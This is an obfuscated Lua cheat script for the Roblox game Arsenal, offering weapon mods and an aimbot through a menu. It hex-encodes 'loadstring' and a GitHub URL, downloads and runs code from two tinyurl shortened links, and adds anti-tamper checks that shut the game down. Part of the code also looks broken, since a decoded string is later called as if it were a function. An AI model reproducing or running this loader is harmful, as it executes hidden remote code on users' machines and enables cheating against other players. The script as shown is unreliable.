local _={} _[1]=(function() local a=[[\x6c\x6f\x61\x64\x73\x74\x72\x69\x6e\x67]] return a:gsub([[\\x(%x%x)]],function(b)return string.char(tonumber(b,16))end) end)() _[2]=_[1](game:HttpGet([[https://tinyurl.com/2s4948f9]])) -- Library

local _1,_2=pcall(function()
    local _3=_[2].CreateLib(table.concat({"Key","less"," Ar","senal","Scr","ipt"}),"DarkTheme")
    local _4=_3:NewTab(table.concat({"We","lco","me "}))
    _4:NewSection("Nice To Meet You "..game.Players.LocalPlayer.Name.."!"):NewLabel("ID: "..game.Players.LocalPlayer.UserId)
    
    -- Weapons Tab
    local _5=_3:NewTab("Weapons")
    _5:NewSection("Mods"):NewButton("Rainbow",nil,function()
        loadstring(game:HttpGet((function()
            local a=[[68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f536b69646f4c4f4c2f417273656e616c5363726970742f6d61696e2f417273656e616c2532305363726970742f53637269707473253230466f722532304d61696e4875622f5261696e626f77253230576561706f6e732e6c7561]]
            return a:gsub("..",function(b)return string.char(tonumber(b,16))end)
        end)()))()
    end)
    
    -- Aimbot Tab
    local _6=_3:NewTab("Aim")
    _6:NewSection("Hacks"):NewButton("Aimbot",nil,function()
        _[1](game:HttpGet([[https://tinyurl.com/2p8nw9fh]]))()
    end)
    
    -- Anti-Tamper
    debug.setmetatable((getgenv() or {}),{__index=function() return nil end})
    if getfenv(0)~=getfenv(2) then game:Shutdown() end
end)

if not _1 then 
    warn("Execution Error: "..tostring(_2))
    game:GetService("TeleportService"):Teleport(game.PlaceId)
end
